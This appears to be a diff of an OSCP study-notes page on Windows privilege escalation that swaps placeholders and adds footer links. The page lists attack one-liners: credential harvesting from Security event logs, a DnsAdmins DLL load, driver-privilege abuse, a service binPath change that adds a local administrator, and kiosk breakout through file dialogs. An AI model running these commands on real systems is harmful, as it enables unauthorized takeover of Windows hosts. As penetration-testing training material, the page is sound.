@@ -159,7 +159,7 @@ Expanded privilege triage beyond the base module. See [[17. Windows Privilege Es
 | Event Log Readers | `wevtutil qe Security /f:text \| Select-String "/user"` → cleartext creds in process creation logs |
 | DnsAdmins | `dnscmd /config /serverlevelplugindll <malicious.dll>` → restart DNS → SYSTEM DLL load |
 | Print Operators | SeLoadDriverPrivilege → EoPLoadDriver + ExploitCapcom → SYSTEM |
-| Server Operators | `sc config <service> binPath= "cmd /c net localgroup Administrators <user> /add"` → sc start → local admin |
+| Server Operators | `sc config <service> binPath= "cmd /c net localgroup Administrators $Username /add"` → sc start → local admin |
 
 See [[17. Windows Privilege Escalation|WPE.7]] through [[17. Windows Privilege Escalation|WPE.11]].
 
@@ -253,7 +253,7 @@ See [[17. Windows Privilege Escalation|WPE.23]], [[17. Windows Privilege Escalat
 Restricted desktop: only approved apps accessible
          ↓
 Option 1: Open/Save dialog trick
-  Open Paint → File → Open → type \\127.0.0.1\c$\users\<user> → All Files
+  Open Paint → File → Open → type \\127.0.0.1\c$\users\$Username → All Files
   Browse full filesystem via UNC in the Open dialog
          ↓
 Option 2: SMB share + cmd.exe launcher
@@ -299,3 +299,14 @@ Server Operators membership?
 - [RevShells](https://www.revshells.com/) for shell troubleshooting
 - [CyberChef](https://gchq.github.io/CyberChef/) for transformations
 - [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/17. Windows Privilege Escalation]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] -- demonstrates the workflow described here
